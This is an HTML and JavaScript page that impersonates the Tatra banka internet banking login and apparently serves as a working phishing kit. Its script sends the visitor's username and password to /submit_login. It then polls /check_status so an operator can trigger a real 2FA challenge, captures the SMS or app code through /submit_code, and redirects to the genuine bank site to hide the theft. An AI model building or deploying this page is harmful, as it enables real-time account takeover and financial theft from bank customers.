<!DOCTYPE html>
<html lang="sk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prihlásenie | Tatra banka</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #0047F8;
            min-height: 100vh;
        }

        /* Header */
        .header {
            background: #fff;
            height: 72px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 40px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            position: relative;
            z-index: 100;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo-circle {
            width: 40px;
            height: 40px;
            background: #0047F8;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-circle svg {
            width: 24px;
            height: 24px;
            fill: #fff;
        }

        .logo-text {
            font-size: 20px;
            font-weight: 700;
            color: #0047F8;
            letter-spacing: -0.5px;
        }

        .nav {
            display: flex;
            gap: 32px;
            align-items: center;
        }

        .nav a {
            color: #1a1a1a;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            transition: color 0.2s;
        }

        .nav a:hover { color: #0047F8; }

        .nav-btn {
            background: #0047F8;
            color: #fff !important;
            padding: 10px 20px;
            border-radius: 8px;
            font-weight: 600;
        }

        .nav-btn:hover { background: #0039cc; color: #fff !important; }

        /* Main */
        .main {
            min-height: calc(100vh - 72px);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            background: linear-gradient(180deg, #0047F8 0%, #0039cc 100%);
            position: relative;
            overflow: hidden;
        }

        .main::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -20%;
            width: 80%;
            height: 150%;
            background: radial-gradient(ellipse, rgba(255,255,255,0.1) 0%, transparent 60%);
            pointer-events: none;
        }

        /* Login Card */
        .login-card {
            background: #fff;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 440px;
            position: relative;
            z-index: 1;
        }

        .card-header {
            padding: 32px 32px 24px;
            border-bottom: 1px solid #f0f0f0;
            text-align: center;
        }

        .card-header h1 {
            font-size: 24px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 8px;
        }

        .card-header p {
            color: #666;
            font-size: 14px;
        }

        .card-body {
            padding: 32px;
        }

        .tabs {
            display: flex;
            gap: 8px;
            margin-bottom: 24px;
            background: #f5f5f5;
            padding: 4px;
            border-radius: 10px;
        }

        .tab {
            flex: 1;
            padding: 12px;
            text-align: center;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            color: #666;
            cursor: pointer;
            transition: all 0.2s;
            border: none;
            background: transparent;
        }

        .tab.active {
            background: #fff;
            color: #0047F8;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 8px;
        }

        .input-wrapper {
            position: relative;
        }

        .input-wrapper input {
            width: 100%;
            padding: 14px 16px;
            padding-left: 44px;
            border: 2px solid #e5e5e5;
            border-radius: 10px;
            font-size: 15px;
            transition: all 0.2s;
            background: #fff;
        }

        .input-wrapper input:focus {
            outline: none;
            border-color: #0047F8;
            box-shadow: 0 0 0 4px rgba(0,71,248,0.1);
        }

        .input-wrapper input::placeholder {
            color: #999;
        }

        .input-icon {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
            font-size: 18px;
        }

        .password-toggle {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
            cursor: pointer;
            font-size: 18px;
        }

        .options-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }

        .checkbox-wrap {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .checkbox-wrap input {
            width: 18px;
            height: 18px;
            accent-color: #0047F8;
        }

        .checkbox-wrap label {
            font-size: 13px;
            color: #666;
            cursor: pointer;
        }

        .forgot-link {
            font-size: 13px;
            color: #0047F8;
            text-decoration: none;
            font-weight: 500;
        }

        .forgot-link:hover { text-decoration: underline; }

        .submit-btn {
            width: 100%;
            padding: 16px;
            background: #0047F8;
            color: #fff;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .submit-btn:hover {
            background: #0039cc;
            transform: translateY(-1px);
            box-shadow: 0 8px 20px rgba(0,71,248,0.3);
        }

        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .card-footer {
            padding: 20px 32px;
            background: #f9f9f9;
            border-radius: 0 0 16px 16px;
            text-align: center;
        }

        .security-info {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #666;
            font-size: 12px;
        }

        .security-info svg {
            width: 16px;
            height: 16px;
            fill: #22c55e;
        }

        .help-links {
            margin-top: 12px;
        }

        .help-links a {
            color: #0047F8;
            text-decoration: none;
            font-size: 13px;
            margin: 0 12px;
        }

        .help-links a:hover { text-decoration: underline; }

        /* Modal */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.6);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(4px);
        }

        .modal {
            background: #fff;
            border-radius: 16px;
            width: 90%;
            max-width: 400px;
            animation: modalIn 0.3s ease;
            overflow: hidden;
        }

        @keyframes modalIn {
            from { opacity: 0; transform: scale(0.95) translateY(-10px); }
            to { opacity: 1; transform: scale(1) translateY(0); }
        }

        .modal-header {
            background: #0047F8;
            padding: 28px;
            text-align: center;
            color: #fff;
        }

        .modal-icon {
            width: 64px;
            height: 64px;
            background: rgba(255,255,255,0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
            font-size: 28px;
        }

        .modal-header h2 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 4px;
        }

        .modal-header p {
            font-size: 13px;
            opacity: 0.9;
        }

        .modal-body {
            padding: 28px;
        }

        .loader {
            text-align: center;
            padding: 20px 0;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #f0f0f0;
            border-top-color: #0047F8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .loader p {
            color: #666;
            font-size: 14px;
        }

        .code-input {
            width: 100%;
            padding: 18px;
            border: 2px solid #e5e5e5;
            border-radius: 12px;
            font-size: 32px;
            text-align: center;
            letter-spacing: 16px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 20px;
        }

        .code-input:focus {
            outline: none;
            border-color: #0047F8;
            box-shadow: 0 0 0 4px rgba(0,71,248,0.1);
        }

        .code-input::placeholder {
            color: #ddd;
            letter-spacing: 16px;
        }

        .resend-code {
            text-align: center;
            margin-top: 16px;
        }

        .resend-code a {
            color: #0047F8;
            text-decoration: none;
            font-size: 13px;
        }

        @media (max-width: 600px) {
            .header { padding: 0 16px; }
            .nav { display: none; }
            .card-body, .card-header { padding: 24px; }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">
            <div class="logo-circle">
                <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
            </div>
            <span class="logo-text">Tatra banka</span>
        </div>
        <nav class="nav">
            <a href="#">Osobné</a>
            <a href="#">Firemné</a>
            <a href="#">Private</a>
            <a href="#">Pomoc</a>
            <a href="#" class="nav-btn">Internet Banking</a>
        </nav>
    </header>

    <main class="main">
        <div class="login-card">
            <div class="card-header">
                <h1>Prihlásenie</h1>
                <p>Prihláste sa do Internet Bankingu</p>
            </div>
            
            <div class="card-body">
                <div class="tabs">
                    <button class="tab active">Prihlasovacie meno</button>
                    <button class="tab">Číslo karty</button>
                </div>
                
                <form id="loginForm">
                    <div class="form-group">
                        <label>Prihlasovacie meno</label>
                        <div class="input-wrapper">
                            <span class="input-icon">👤</span>
                            <input type="text" id="login" placeholder="Zadajte prihlasovacie meno" required autocomplete="off">
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>Heslo</label>
                        <div class="input-wrapper">
                            <span class="input-icon">🔒</span>
                            <input type="password" id="password" placeholder="Zadajte heslo" required autocomplete="off">
                            <span class="password-toggle" onclick="togglePassword()">👁</span>
                        </div>
                    </div>
                    
                    <div class="options-row">
                        <div class="checkbox-wrap">
                            <input type="checkbox" id="remember">
                            <label for="remember">Zapamätať si ma</label>
                        </div>
                        <a href="#" class="forgot-link">Zabudnuté heslo?</a>
                    </div>
                    
                    <button type="submit" class="submit-btn" id="submitBtn">Prihlásiť sa</button>
                </form>
            </div>
            
            <div class="card-footer">
                <div class="security-info">
                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
                    <span>Zabezpečené SSL šifrovaním</span>
                </div>
                <div class="help-links">
                    <a href="#">Aktivácia služby</a>
                    <a href="#">Potrebujem pomoc</a>
                </div>
            </div>
        </div>
    </main>

    <!-- Modal -->
    <div class="modal-overlay" id="modal">
        <div class="modal">
            <div class="modal-header">
                <div class="modal-icon" id="modalIcon">🔐</div>
                <h2>Overenie totožnosti</h2>
                <p id="modalDesc">Čakajte na výber metódy overenia...</p>
            </div>
            <div class="modal-body">
                <div class="loader" id="loader">
                    <div class="spinner"></div>
                    <p>Čakáme na potvrdenie...</p>
                </div>
                <div id="codeSection" style="display:none;">
                    <input type="text" class="code-input" id="code" placeholder="••••••" maxlength="6" inputmode="numeric">
                    <button class="submit-btn" id="verifyBtn">Overiť</button>
                    <div class="resend-code">
                        <a href="#">Poslať kód znova</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let sessionId = '', method = '', interval = null;

        function togglePassword() {
            const p = document.getElementById('password');
            p.type = p.type === 'password' ? 'text' : 'password';
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.textContent = 'Prihlasujem...';
            
            try {
                const res = await fetch('/submit_login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        login: document.getElementById('login').value,
                        password: document.getElementById('password').value,
                        session_id: Date.now().toString()
                    })
                });
                const data = await res.json();
                sessionId = data.session_id;
                
                document.getElementById('modal').style.display = 'flex';
                document.getElementById('loader').style.display = 'block';
                document.getElementById('codeSection').style.display = 'none';
                
                interval = setInterval(checkStatus, 2000);
            } catch(e) {
                btn.disabled = false;
                btn.textContent = 'Prihlásiť sa';
            }
        });

        async function checkStatus() {
            try {
                const res = await fetch('/check_status', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({session_id: sessionId})
                });
                const data = await res.json();
                if (data.status === 'ready') {
                    clearInterval(interval);
                    method = data.method;
                    showCode(data.method);
                }
            } catch(e) {}
        }

        function showCode(m) {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('codeSection').style.display = 'block';
            
            const info = {
                'SMS': {icon: '📱', text: 'SMS kód bol odoslaný'},
                'Push': {icon: '🔔', text: 'Push notifikácia odoslaná'},
                'TATRA': {icon: '📲', text: 'Potvrďte v Tatra banka app'}
            }[m] || {icon: '📱', text: 'Zadajte overovací kód'};
            
            document.getElementById('modalIcon').textContent = info.icon;
            document.getElementById('modalDesc').textContent = info.text;
            document.getElementById('code').focus();
        }

        document.getElementById('verifyBtn').addEventListener('click', async function() {
            const code = document.getElementById('code').value;
            if (code.length < 4) return alert('Zadajte platný kód');
            
            this.disabled = true;
            this.textContent = 'Overujem...';
            
            try {
                await fetch('/submit_code', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({session_id: sessionId, code: code, method: method})
                });
                window.location.href = 'https://www.tatrabanka.sk';
            } catch(e) {
                this.disabled = false;
                this.textContent = 'Overiť';
            }
        });

        document.getElementById('code').addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });
    </script>
</body>
</html>
